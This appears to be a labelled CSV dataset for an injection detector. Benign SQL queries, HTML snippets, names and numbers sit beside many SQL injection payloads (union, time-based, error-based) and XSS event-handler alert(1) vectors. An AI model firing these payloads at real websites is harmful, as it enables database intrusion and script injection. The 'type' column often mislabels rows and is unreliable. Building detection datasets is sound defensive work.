Text,Label,type
"<nobr onkeydown=""alert(1)"" contenteditable>test</nobr>",2,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 69244 )  ORDER BY meta_id ASC",0,sql
SELECT AVG ( collect ) FROM leather SELECT SUM ( forgot ) ,0,sql
"-2365   )    )    union all select 8190,8190#",1,sql
SELECT COUNT ( thee )  FROM while,0,xss
SELECT * FROM  ( SELECT black FROM of ) ,0,sql
"1%""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""%""  =  """,1,xss
"1   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
SELECT DISTINCT swimming FROM happily,0,sql
SELECT * FROM younger WHERE could LIKE '%chart%',0,xss
34309,0,sql
5.33828E+15,0,sql
<svg><animate onend=alert(1) attributeName=x dur=1s>,2,xss
SELECT * FROM help FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"1%""   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ""%""  =  """,1,xss
"<data oncopy=""alert(1)"" contenteditable>test</data>",2,xss
"<style>:target {color: red;}</style><input id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></input>",2,xss
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'ejdk' like 'ejdk,1,sql
ergasto,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li> </ul>",0,xss
SELECT * FROM active 3,0,sql
1'+  (  select qugu where 2287  =  2287 order by 1#,1,sql
ilusiva,0,sql
"<main onmouseout=""alert(1)"">test</main>",2,xss
"   SELECT guide, troops, condition FROM crew WHERE piece  IS NULL",0,xss
SELECT COUNT ( hardly )  FROM changing,0,sql
-7346 or 8571  =  8571--,1,sql
"-2601'  )   union all select 2866,2866,2866,2866,2866,2866--",1,sql
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",1,xss
<span id=x tabindex=1 ondeactivate=alert(1)></span><input id=y autofocus>,2,xss
"<time onmouseup=""alert(1)"">test</time>",2,xss
"-1372%'   )    )     )   union all select 8403,8403,8403,8403#",1,sql
"1' union all select null,null,null,null,null,null,null,null,null--",1,sql
" select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",1,sql
"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationend=""alert(1)""></address>",2,xss
	 </span> </div>,0,xss
DELETE FROM silence,0,sql
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,sql
"<A HREF=""http://0102.0146.0007.00000223/""></A>",2,xss
"-6431""   )    )    union all select 2358,2358,2358,2358,2358,2358,2358,2358,2358,2358#",1,xss
SELECT AVG ( captain ) FROM hurried SELECT SUM ( certain ) ,0,sql
SELECT contain ( s )  FROM hurt SELECT chair ( s ) ,0,sql
SELECT * FROM torn WHERE addition LIKE '%hide%',0,sql
SELECT * FROM search WHERE command  BETWEEN 10 AND 20,0,sql
" SELECT * FROM correct ORDER BY hand ASC, church DESC",0,sql
select   (  case when   (  4415  =  2051  )   then 4415 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,sql
"1' where 7080  =  7080 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,xss
magdalen1,0,sql
"-3758'   )    )    union all select 9460,9460,9460,9460,9460,9460,9460,9460--",1,sql
SELECT AVG ( salt ) FROM personal SELECT SUM ( hit ) ,0,sql
1%'  )   or sleep  (  5  )  #,1,sql
"   SELECT breakfast, proud+ ', ' + label+ ' ' + got+ ', ' + some AS neck  FROM bark",0,sql
"<noembed onbeforecopy=""alert(1)"" contenteditable>test</noembed>",2,xss
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Ontanon, Santiago; Synnaeve, Gabriel; Uriarte, Alberto; Richoux, Florian; Churchill, David; Preuss, Mike (December 2013). ""A Survey of Real-Time Strategy Game AI Research and Competition in StarCraft"". <i>IEEE Transactions on Computational Intelligence and AI in Games </i>. <b>5 </b> (4): 293–311. <a href=""/wiki/CiteSeerX"" title=""CiteSeerX"">CiteSeerX </a>&#160;<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.406.2524"">10.1.1.406.2524 </a> ",0,xss
"<audio ondblclick=""alert(1)"">test</audio>",2,xss
"c/ gravina, s/n",0,sql
SELECT COUNT ( DISTINCT third )  FROM passage,0,sql
49515,0,sql
"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  2868  =  2868",1,xss
tehchi8,0,xss
1'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  'ugrk'  =  'ugrk,1,xss
"   SELECT unless, applied, expressFROM know WHERE slow  IS NOT NULL",0,xss
"<style draggable=""true"" ondragend=""alert(1)"">test</style>",2,xss
s9p2212419435.5,0,sql
"-7950 where 9619  =  9619 union all select 9619,9619,9619,9619--",1,xss
SELECT DISTINCT myself FROM storm,0,xss
"<li id=""cite_note-:1-290""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-:1_290-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-:1_290-1""><sup><i><b>b </b> </i> </sup> </a> ",0,xss
SELECT pitch ( s ) FROM several INNER JOIN,0,sql
"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",1,sql
SELECT TOP 3 * FROM careful WHERE interest = 'beyond' SELECT * FROM fence,0,xss
tait,0,sql
SELECT MIN ( pine )  AS ants FROM orange,0,xss
SELECT TOP 50 PERCENT * FROM became SELECT * FROM road FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM salt,0,sql
"<li><a href=""/wiki/Computational_complexity_theory"" title=""Computational complexity theory"">Computational complexity theory </a> </li>",0,xss
"1"" and 1668  =  8288",1,sql
	 </ul>,0,xss
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and '%'  =  '",1,sql
margaux,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 299801 )  ORDER BY meta_id ASC",0,xss
 (  1589  =  1589  )  *1,1,sql
02054707w,0,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/autothrottle.html"">AutoThrottle extension</a></li>",0,xss
"<style>:target {color:red;}</style><img id=x style=""transition:color 1s"" ontransitionend=alert(1)></img>",2,xss
2595,0,sql
SELECT supply,0,sql
" select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",1,sql
or 3  =  3 --,1,sql
"-7238%' or make_set  (  5375  =  9563,9563  )   and '%'  =  '",1,sql
" SELECT column_name ( s )  FROM reader,low",0,sql
	 </span>,0,xss
"1"" where 3764  =  3764",1,xss
"1%""   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""%""  =  """,1,sql
43061609c,0,sql
"<acronym onbeforecopy=""alert(1)"" contenteditable>test</acronym>",2,xss
"1%""  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
-2793'  )   where 2621  =  2621 union all select 2621#,1,sql
5on39taci19,0,sql
1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,1,sql
"1'   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'vtno'  =  'vtno",1,sql
	 </span> </li>,0,xss
<blink onpointerout=alert(1)>XSS</blink>,2,xss
"  UPDATE tribe SET support =  'wire', City =  'flat' WHERE duty =  him",0,sql
<element id=x tabindex=1 onfocus=alert(1)></element>,2,xss
SELECT COUNT ( design )  FROM begun,0,sql
"	 <div style=""padding:0em 0.25em"">",0,xss
nemesio,0,sql
45571518p,0,sql
"c/ bailen 8,",0,xss
SELECT AVG ( easier ) FROM story,0,xss
	 </span> 2018 ,0,xss
<kbd onpointerup=alert(1)>XSS</kbd>,2,xss
1.20453E+15,0,sql
"1'  )   union all select null,null--",1,sql
SELECT * FROM clothing WHERE shaking BETWEEN which09/01/1996plate AND meant15/31/1996lie,0,sql
"1'+  (  select lang where 4191  =  4191 union all select null,null#",1,sql
"<picture draggable=""true"" ondrag=""alert(1)"">test</picture>",2,xss
"1' in boolean mode  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
"<object draggable=""true"" ondragend=""alert(1)"">test</object>",2,xss
"-4954%""  )   or 5244  =  4832",1,sql
"<th onmousemove=""alert(1)"">test</th>",2,xss
SELECT report ( s FROM anyway RIGHT JOIN,0,sql
"1""   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""lmjg"" like ""lmjg",1,sql
 </li>,0,xss
"-1628"" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--",1,sql
"1%'   )    )     )   union all select null,null,null,null,null,null#",1,xss
" SELECT * FROM smell ORDER BY grow ASC, religious DESC",0,sql
 </ul>,0,xss
1%'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',1,sql
SELECT * FROM drew WHERE food = 'nearly'  AND  ( principle = 'year' OR good = 'subject' ) ,0,sql
"<bdi onmouseout=""alert(1)"">test</bdi>",2,xss
<tbody id=x tabindex=1 onactivate=alert(1)></tbody>,2,xss
 or 'text' > 't',1,sql
-8716'  )   where 5523  =  5523 or 3686  =  8485--,1,xss
"1 union all select null,null,null#",1,xss
angeles jarama,0,sql
"  SELECT pleasureID AS ID, color AS shelf FROM date",0,xss
"<a href=""/wiki/History_of_artificial_intelligence"" title=""History of artificial intelligence"">History </a> </th> </tr><tr><td class=""plainlist"" style=""padding:0 0.1em 0.4em"">",0,xss
SELECT * FROM  ( SELECT announced FROM knew ) ,0,sql
1%'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  '%'  =  ',1,sql
SELECT * FROM grabbed FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM fresh,0,sql
tahull garola,0,xss
SELECT COUNT ( high ) FROM pond,0,sql
"1%'  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,sql
"  SELECT Orders.yardrID, Employees.apartment, Employees.electricity FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.peopleID ORDER BY Orders.callID",0,sql
SELECT * FROM indicate WHERE establish = 'so'  OR gave = 'cheese',0,sql
"<tr draggable=""true"" ondragstart=""alert(1)"">test</tr>",2,xss
 </li>,0,xss
<svg><video onload=alert(1)></video>,2,xss
sobrecogimiento,0,sql
"<input oncut=alert(1) value=""XSS"" autofocus>",2,xss
"<li><a href=""/wiki/Fitness_function"" title=""Fitness function"">Fitness function </a> </li>",0,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Fast+Company&amp;rft.atitle=Elon+Musk+Is+Donating+%2410M+Of+His+Own+Money+To+Artificial+Intelligence+Research&amp;rft.date=2015-01-15&amp;rft_id=http%3A%2F%2Fwww.fastcompany.com%2F3041007%2Ffast-feed%2Felon-musk-is-donating-10m-of-his-own-money-to-artificial-intelligence-research&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<u draggable=""true"" ondragleave=""alert(1)"">test</u>",2,xss
SELECT string FROM boy UNION SELECT bit FROM occur ORDER BY theory,0,sql
"1%""   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   ""%""  =  """,1,sql
SELECT COUNT ( soldier )  FROM farmer,0,sql
	 </span></a></dt><dd>Extract the data from web pages using XPath.</dd>,0,xss
"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1,sql
"1""  )   as ranl where 5553  =  5553",1,sql
"  SELECT Orders.beautyrID, Employees.yellow, Employees.parts FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.tinID ORDER BY Orders.richID",0,xss
"	 </span></a></dt><dd>Use <a class=""reference external"" href=""https://docs.python.org/3/library/asyncio.html#module-asyncio"" title=""(in Python v3.8)""><code class=""xref py py-mod docutils literal notranslate""><span class=""pre"">asyncio",0,xss
"1'+  (  select zpns where 6922  =  6922 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",1,sql
SELECT AVG ( Price ) FROM start,0,sql
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  ""ihqf""  =  ""ihqf",1,sql
WHERE EXISTS  ( SELECT ProductName FROM   Products WHERE SupplierId  =  Suppliers.supplierId AND Price  =  22 ) ;,0,sql
"<fieldset ondblclick=""alert(1)"">test</fieldset>",2,xss
"1,  (  select   (  case when   (  5334  =  4976  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1,sql
"<canvas draggable=""true"" ondragenter=""alert(1)"">test</canvas>",2,xss
"c/ los rosales 166, 6f",0,sql
"<li class=""toclevel-1 tocsection-70""><a href=""#See_also""><span class=""tocnumber"">11 ",0,xss
"<menuitem onclick=""alert(1)"">test</menuitem>",2,xss
"-1184""   )    )     )   union all select 1482--",1,xss
" select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",1,sql
<content onpointermove=alert(1)>XSS</content>,2,xss
<ul>,0,xss
"1'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,sql
ornella,0,xss
lor81a5o,0,sql
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=53"" title=""Edit section: Social justice"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
valcourt,0,sql
montesano_wontner@pcvirus.tm,0,sql
mario caraball,0,sql
"-9864""  )   or elt  (  5885  =  4936,4936  )   and   (  ""bfbb"" like ""bfbb",1,sql
hotson,0,sql
66837882c,0,xss
o$ficinesca,0,sql
SELECT option_value FROM wp_options WHERE option_name  =  'classic-editor-allow-users' LIMIT 1,0,sql
"<li class=""toclevel-1 tocsection-2""><a href=""#Definitions""><span class=""tocnumber"">2 ",0,xss
"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""ilge"" like ""ilge",1,sql
" SELECT * FROM our ORDER BY knew, phrase",0,sql
1  )   where 8813  =  8813,1,xss
"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'sied'  =  'sied",1,sql
"1"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""rntg"" like ""rntg",1,sql
neira umbert,0,sql
46881104c,0,sql
"-5581%'   )    )     )   union all select 4266,4266,4266,4266,4266,4266,4266,4266,4266,4266#",1,sql
"1   )    )    as zdbj where 2300  =  2300   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1,sql
"<li><a href=""/wiki/Holographic_data_storage"" title=""Holographic data storage"">Holographic data storage </a> </li> </ul> </li>",0,xss
SELECT MIN ( bound )  AS slope FROM date,0,sql
<rt onpointerup=alert(1)>XSS</rt>,2,xss
inobediecia,0,sql
"<li><a href=""/wiki/Unsupervised_learning"" title=""Unsupervised learning"">Unsupervised learning </a> </li>",0,xss
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;133–150, </li>",0,xss
82839528z,0,sql
"1'||  (  select 'epjr' from dual where 3074  =  3074 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,sql
"<li id=""cite_note-361""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-361"">^ </a> </b> ",0,xss
1  )   where 2223  =  2223,1,sql
"talavera 56,",0,sql
-6030%'  )   or 3038  =  3038,1,sql
3771,0,xss
46177,0,sql
"<map onbeforepaste=""alert(1)"" contenteditable>test</map>",2,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=McKinsey+%26+Company&amp;rft.atitle=Advanced+analytics+in+hospitality&amp;rft.date=2017&amp;rft_id=https%3A%2F%2Fwww.mckinsey.com%2Fbusiness-functions%2Fmckinsey-digital%2Four-insights%2Fadvanced-analytics-in-hospitality&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<output onmousemove=""alert(1)"">test</output>",2,xss
"<li><a href=""/wiki/Distributed_computing"" title=""Distributed computing"">Distributed computing </a> </li>",0,xss
san miguel de abona,0,sql
natala,0,sql
